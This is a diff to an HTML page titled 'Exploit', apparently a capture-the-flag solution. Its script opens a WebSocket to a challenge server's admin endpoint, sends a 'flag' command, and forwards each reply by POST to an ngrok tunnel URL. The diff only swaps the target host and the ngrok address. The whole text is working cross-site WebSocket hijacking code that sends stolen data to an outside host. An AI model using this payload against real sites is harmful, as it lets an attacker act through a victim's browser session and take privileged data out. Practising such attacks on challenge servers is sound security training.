@@ -4,7 +4,7 @@
     <title>Exploit</title>
     <script>
         // Step 1: Open a WebSocket connection to the target server
-        var ws = new WebSocket("ws://web:8080/admin/ws");
+        var ws = new WebSocket("ws://ce441-web.spchallenge.ir:8080/admin/ws");
 
         // Step 2: Send the 'flag' command when the connection opens
         ws.onopen = function() {
@@ -14,7 +14,7 @@
         // Step 3: Send the flag via a POST request to your ngrok URL when received
         ws.onmessage = function(event) {
             const xhttp = new XMLHttpRequest();
-            xhttp.open('POST', 'https://6a4a-115-186-169-76.ngrok-free.app/', true);  // Replace with your ngrok URL
+            xhttp.open('POST', 'https://27a6-115-186-169-76.ngrok-free.app/', true);  // Replace with your ngrok URL
             xhttp.send(event.data);  // Send the flag data as the request body
         };
     </script>
